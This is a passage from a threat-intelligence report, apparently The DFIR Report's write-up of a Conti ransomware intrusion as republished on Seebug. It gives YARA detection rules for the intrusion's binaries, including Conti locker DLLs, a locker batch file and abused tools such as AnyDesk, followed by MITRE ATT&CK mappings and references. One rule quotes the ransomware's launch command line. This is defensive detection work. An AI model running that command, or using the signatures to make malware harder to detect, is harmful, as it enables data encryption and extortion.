          $x12 = "ollectionidentifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation c" ascii
          $s13 = "y failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: invalid typeBitsBulkBarrierrunt" ascii
          $s14 = "ddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  found at *( gcscandone  m->gs" ascii
          $s15 = ".dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii
          $s16 = "ked to threadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLookupAccountNameWRFS specific errorSetFile" ascii
          $s17 = "mstartbad sequence numberdevice not a streamdirectory not emptydisk quota exceededdodeltimer: wrong Pfile already closedfile alr" ascii
          $s18 = "structure needs cleaning bytes failed with errno= to unused region of spanGODEBUG: can not enable \"GetQueuedCompletionStatus_cg" ascii
          $s19 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii
          $s20 = "tProcessIdGetSystemDirectoryWGetTokenInformationWaitForSingleObjectadjusttimers: bad pbad file descriptorbad notifyList sizebad " ascii
       condition:
          uint16(0) == 0x5a4d and filesize < 4000KB and
          1 of ($x*) and all of them
    }
    
    rule mal_host1_D8B3 {
       meta:
          description = "mal - file D8B3.dll"
          author = "TheDFIRReport"
          date = "2021-11-29"
          hash1 = "4a49cf7539f9fd5cc066dc493bf16598a38a75f7b656224db1ddd33005ad76f6"
       strings:
          $x1 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii
          $x2 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii
          $x3 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii
          $x4 = "Go pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupted shared libraryruntime: VirtualQuer" ascii
          $x5 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWSetEndOfFileTransmitFileabi mismatchadvapi32" ascii
          $x6 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii
          $x7 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status  mallocing= ms clock" ascii
          $x8 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii
          $x9 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii
          $x10 = "Ptrmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexlocked m0 woke upmark - bad statusmarkBits overf" ascii
          $x11 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii
          $x12 = "ollectionidentifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation c" ascii
          $s13 = "y failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: invalid typeBitsBulkBarrierrunt" ascii
          $s14 = "ddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  found at *( gcscandone  m->gs" ascii
          $s15 = ".dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii
          $s16 = "ked to threadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLookupAccountNameWRFS specific errorSetFile" ascii
          $s17 = "mstartbad sequence numberdevice not a streamdirectory not emptydisk quota exceededdodeltimer: wrong Pfile already closedfile alr" ascii
          $s18 = "structure needs cleaning bytes failed with errno= to unused region of spanGODEBUG: can not enable \"GetQueuedCompletionStatus_cg" ascii
          $s19 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii
          $s20 = "tProcessIdGetSystemDirectoryWGetTokenInformationWaitForSingleObjectadjusttimers: bad pbad file descriptorbad notifyList sizebad " ascii
       condition:
          uint16(0) == 0x5a4d and filesize < 4000KB and
          1 of ($x*) and all of them
    }
    
    
    rule mal_host2_AnyDesk {
       meta:
          description = "mal - file AnyDesk.exe"
          author = "TheDFIRReport"
          date = "2021-11-29"
          hash1 = "8f09c538fc587b882eecd9cfb869c363581c2c646d8c32a2f7c1ff3763dcb4e7"
       strings:
          $x1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" pu" ascii
          $x2 = "C:\\Buildbot\\ad-windows-32\\build\\release\\app-32\\win_loader\\AnyDesk.pdb" fullword ascii
          $s3 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" pu" ascii
          $s4 = "<assemblyIdentity version=\"6.3.2.0\" processorArchitecture=\"x86\" name=\"AnyDesk.AnyDesk.AnyDesk\" type=\"win32\" />" fullword ascii
          $s5 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0O" fullword ascii
          $s6 = "(Symantec SHA256 TimeStamping Signer - G3" fullword ascii
          $s7 = "(Symantec SHA256 TimeStamping Signer - G30" fullword ascii
          $s8 = "http://ocsp.digicert.com0N" fullword ascii
          $s9 = "http://www.digicert.com/CPS0" fullword ascii
          $s10 = "Bhttp://cacerts.digicert.com/DigiCertSHA2AssuredIDCodeSigningCA.crt0" fullword ascii
          $s11 = "<description>AnyDesk screen sharing and remote control software.</description>" fullword ascii
          $s12 = "/http://crl3.digicert.com/sha2-assured-cs-g1.crl05" fullword ascii
          $s13 = "/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L" fullword ascii
          $s14 = "%jgmRhZl%" fullword ascii
          $s15 = "5ZW:\"Wfh" fullword ascii
          $s16 = "5HRe:\\" fullword ascii
          $s17 = "ysN.JTf" fullword ascii
          $s18 = "Z72.irZ" fullword ascii
          $s19 = "Ve:\\-Sj7" fullword ascii
          $s20 = "ekX.cFm" fullword ascii
       condition:
          uint16(0) == 0x5a4d and filesize < 11000KB and
          1 of ($x*) and 4 of them
    }
    
    rule ProcessHacker {
       meta:
          description = "mal - file ProcessHacker.exe"
          author = "TheDFIRReport"
          date = "2021-11-29"
          hash1 = "d4a0fe56316a2c45b9ba9ac1005363309a3edc7acf9e4df64d326a0ff273e80f"
       strings:
          $x1 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe" fullword wide
          $x2 = "D:\\Projects\\processhacker2\\bin\\Release32\\ProcessHacker.pdb" fullword ascii
          $x3 = "ProcessHacker.exe" fullword wide
          $x4 = "kprocesshacker.sys" fullword wide
          $x5 = "ntdll.dll!NtDelayExecution" fullword wide
          $x6 = "ntdll.dll!ZwDelayExecution" fullword wide
          $s7 = "PhInjectDllProcess" fullword ascii
          $s8 = "_PhUiInjectDllProcess@8" fullword ascii
          $s9 = "logonui.exe" fullword wide
          $s10 = "Executable files (*.exe;*.dll;*.ocx;*.sys;*.scr;*.cpl)" fullword wide
          $s11 = "\\x86\\ProcessHacker.exe" fullword wide
          $s12 = "user32.dll!NtUserGetMessage" fullword wide
          $s13 = "ntdll.dll!NtWaitForKeyedEvent" fullword wide
          $s14 = "ntdll.dll!ZwWaitForKeyedEvent" fullword wide
          $s15 = "ntdll.dll!NtReleaseKeyedEvent" fullword wide
          $s16 = "ntdll.dll!ZwReleaseKeyedEvent" fullword wide
          $s17 = "\\kprocesshacker.sys" fullword wide
          $s18 = "\\SystemRoot\\system32\\drivers\\ntfs.sys" fullword wide
          $s19 = "_PhExecuteRunAsCommand2@36" fullword ascii
          $s20 = "_PhShellExecuteUserString@20" fullword ascii
       condition:
          uint16(0) == 0x5a4d and filesize < 4000KB and
          1 of ($x*) and 4 of them
    }
    
    rule unlocker {
       meta:
          description = "mal - file unlocker.exe"
          author = "TheDFIRReport"
          date = "2021-11-29"
          hash1 = "09d7fcbf95e66b242ff5d7bc76e4d2c912462c8c344cb2b90070a38d27aaef53"
       strings:
          $s1 = "For more detailed information, please visit http://www.jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide
          $s2 = "(Symantec SHA256 TimeStamping Signer - G20" fullword ascii
          $s3 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii
          $s4 = "(Symantec SHA256 TimeStamping Signer - G2" fullword ascii
          $s5 = "Causes Setup to create a log file in the user's TEMP directory." fullword wide
          $s6 = "Prevents the user from cancelling during the installation process." fullword wide
          $s7 = "Same as /LOG, except it allows you to specify a fixed path/filename to use for the log file." fullword wide
          $s8 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii
          $s9 = "The Setup program accepts optional command line parameters." fullword wide
          $s10 = "Instructs Setup to load the settings from the specified file after having checked the command line." fullword wide
          $s11 = "Overrides the default component settings." fullword wide
          $s12 = "/MERGETASKS=\"comma separated list of task names\"" fullword wide
          $s13 = "/PASSWORD=password" fullword wide
          $s14 = "Specifies the password to use." fullword wide
          $s15 = "yyyyvvvvvvvvvxxw" fullword ascii
          $s16 = "yyyyyyrrrsy" fullword ascii
          $s17 = "            processorArchitecture=\"x86\"" fullword ascii
          $s18 = "    processorArchitecture=\"x86\"" fullword ascii
          $s19 = "Prevents Setup from restarting the system following a successful installation, or after a Preparing to Install failure that requ" wide
          $s20 = "/DIR=\"x:\\dirname\"" fullword wide
       condition:
          uint16(0) == 0x5a4d and filesize < 7000KB and
          8 of them
    }
    
    rule mal_host2_locker {
       meta:
          description = "mal - file locker.bat"
          author = "TheDFIRReport"
          date = "2021-11-29"
          hash1 = "1edfae602f195d53b63707fe117e9c47e1925722533be43909a5d594e1ef63d3"
       strings:
          $x1 = "_locker.exe -m -net -size 10 -nomutex -p" ascii
       condition:
          uint16(0) == 0x7473 and filesize < 8KB and
          $x1
    }
    
    import "pe"
    
    rule o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker {
       meta:
          description = "conti - file o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe"
          author = "The DFIR Report"
          reference = "https://thedfirreport.com"
          date = "2021-11-29"
          hash1 = "9cd3c0cff6f3ecb31c7d6bc531395ccfd374bcd257c3c463ac528703ae2b0219"
       strings:
          $s1 = "AppPolicyGetProcessTerminationMethod" fullword ascii
          $s2 = "operator co_await" fullword ascii
          $s3 = ">*>6>A>_>" fullword ascii /* hex encoded string 'j' */
          $s4 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
          $s5 = "Bapi-ms-win-core-fibers-l1-1-1" fullword wide
          $s6 = "SVWjEhQ" fullword ascii
          $s7 = ";F;[;l;" fullword ascii /* Goodware String - occured 1 times */
          $s8 = "74787@7H7P7T7\\7p7" fullword ascii /* Goodware String - occured 1 times */
          $s9 = "6#606B6" fullword ascii /* Goodware String - occured 1 times */
          $s10 = "<!=X=u=" fullword ascii /* Goodware String - occured 1 times */
          $s11 = "expand 32-byte k" fullword ascii /* Goodware String - occured 1 times */
          $s12 = "6!7?7J7" fullword ascii /* Goodware String - occured 2 times */
          $s13 = "delete" fullword ascii /* Goodware String - occured 2789 times */
          $s14 = "4!4(4/464=4D4K4R4Z4b4j4v4" fullword ascii /* Goodware String - occured 3 times */
          $s15 = ".CRT$XIAC" fullword ascii /* Goodware String - occured 3 times */
          $s16 = "0#0)01060\\0a0" fullword ascii
          $s17 = ";\";/;=;K;V;l;" fullword ascii
          $s18 = "6,606P6X6\\6x6" fullword ascii
          $s19 = "6(6,6@6D6H6L6P6T6X6\\6`6d6p6t6x6|6" fullword ascii
          $s20 = "8 :M:}:" fullword ascii
       condition:
          uint16(0) == 0x5a4d and filesize < 600KB and
          ( pe.imphash() == "50472e0ba953856d228c7483b149ea72" or all of them )
    }
    
    rule o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x86 {
       meta:
          description = "conti - file o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x86.dll"
          author = "The DFIR Report"
          reference = "https://thedfirreport.com"
          date = "2021-11-29"
          hash1 = "01a9549c015cfcbff4a830cea7df6386dc5474fd433f15a6944b834551a2b4c9"
       strings:
          $s1 = "conti_v3.dll" fullword ascii
          $s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii
          $s3 = "6 7/787E7[7" fullword ascii /* hex encoded string 'gx~w' */
          $s4 = "operator co_await" fullword ascii
          $s5 = "2%3.3f3~3" fullword ascii /* hex encoded string '#?3' */
          $s6 = "1\"1&1,:4:<:D:L:T:\\:d:l:t:|:" fullword ascii $s7 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide $s8 = "SVWjEhQ" fullword ascii $s9 = "__swift_2" fullword ascii $s10 = "__swift_1" fullword ascii $s11 = "api-ms-win-core-file-l1-2-2" fullword wide /* Goodware String - occured 1 times */ $s12 = "7K7P7T7X7\\7" fullword ascii /* Goodware String - occured 1 times */ $s13 = "7h7o7v7}7" fullword ascii /* Goodware String - occured 1 times */ $s14 = "O0a0s0" fullword ascii /* Goodware String - occured 1 times */ $s15 = ";?;I;S;" fullword ascii /* Goodware String - occured 1 times */ $s16 = "8>8C8Q8V8" fullword ascii /* Goodware String - occured 1 times */
          $s17 = "QQSVj8j@" fullword ascii
          $s18 = "5-5X5s5" fullword ascii /* Goodware String - occured 1 times */
          $s19 = "expand 32-byte k" fullword ascii /* Goodware String - occured 1 times */
          $s20 = "delete" fullword ascii /* Goodware String - occured 2789 times */
       condition:
          uint16(0) == 0x5a4d and filesize < 600KB and
          ( pe.imphash() == "749dc5143e9fc01aa1d221fb9a48d5ea" or all of them )
    }
    
    rule o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x64 {
       meta:
          description = "conti - file o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x64.dll"
          author = "The DFIR Report"
          reference = "https://thedfirreport.com"
          date = "2021-11-29"
          hash1 = "31656dcea4da01879e80dff59a1af60ca09c951fe5fc7e291be611c4eadd932a"
       strings:
          $s1 = "conti_v3.dll" fullword ascii
          $s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii
          $s3 = "operator co_await" fullword ascii
          $s4 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
          $s5 = "api-ms-win-core-file-l1-2-2" fullword wide /* Goodware String - occured 1 times */
          $s6 = "__swift_2" fullword ascii
          $s7 = "__swift_1" fullword ascii
          $s8 = "expand 32-byte k" fullword ascii /* Goodware String - occured 1 times */
          $s9 = "u3HcH<H" fullword ascii /* Goodware String - occured 2 times */
          $s10 = "D$XD9x" fullword ascii /* Goodware String - occured 2 times */
          $s11 = "delete" fullword ascii /* Goodware String - occured 2789 times */
          $s12 = "ue!T$(H!T$ " fullword ascii
          $s13 = "L$&8\\$&t,8Y" fullword ascii
          $s14 = "F 2-by" fullword ascii
          $s15 = "u\"8Z(t" fullword ascii
          $s16 = "L$ |+L;" fullword ascii
          $s17 = "vB8_(t" fullword ascii
          $s18 = "ext-ms-" fullword wide
          $s19 = "OOxq*H" fullword ascii
          $s20 = "H97u+A" fullword ascii
       condition:
          uint16(0) == 0x5a4d and filesize < 600KB and
          ( pe.imphash() == "137fa89046164fe07e0dd776ed7a0191" or all of them )
    }

### MITRE

    
    
    T1218.010 - Signed Binary Proxy Execution: Regsvr32
    T1218.005 - Signed Binary Proxy Execution: Mshta
    T1218.011 - Signed Binary Proxy Execution: Rundll32
    T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage
    T1105 - Ingress Tool Transfer
    T1059.005 - Command and Scripting Interpreter: Visual Basic
    T1059.007 - Command and Scripting Interpreter: JavaScript
    T1059.001 - Command and Scripting Interpreter: PowerShell
    T1055 - Process Injection
    T1486 - Data Encrypted for Impact
    T1482 - Domain Trust Discovery
    T1047 - Windows Management Instrumentation
    T1021.002 - Remote Services: SMB/Windows Admin Shares
    T1124 - System Time Discovery
    T1021.001 - Remote Services: Remote Desktop Protocol
    T1566.001 - Phishing: Spearphishing Attachment
    T1087.002 - Account Discovery: Domain Account
    T1087.001 - Account Discovery: Local Account
    T1057 - Process Discovery
    T1083 - File and Directory Discovery
    T1590.005 - Gather Victim Network Information: IP Addresses

### MITRE Software

    
    
    Net – S0039
    Nltest – S0359
    Cmd – S0106
    Tasklist – S0057
    Cobalt Strike – S0154
    AdFind - S0552

### Reference

  * [Detecting Rclone – An Effective Tool for Exfiltration, NCC Group](https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/)
  * [Rundll32, Red Canary](https://redcanary.com/threat-detection-report/techniques/rundll32/)
  * [TA551 (Shathak) continues pushing BazarLoader, infections lead to Cobalt Strike, SANS ISC](https://isc.sans.edu/forums/diary/TA551+Shathak+continues+pushing+BazarLoader+infections+lead+to+Cobalt+Strike/27738/)
  * [Invoke-ShareFinder, GitHub [Veil PowerView]](https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1)
  * [taskmgr.exe slashing numbers, Hexicorn](https://www.hexacorn.com/blog/2018/07/22/taskmgr-exe-slashing-numbers/)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1774/>

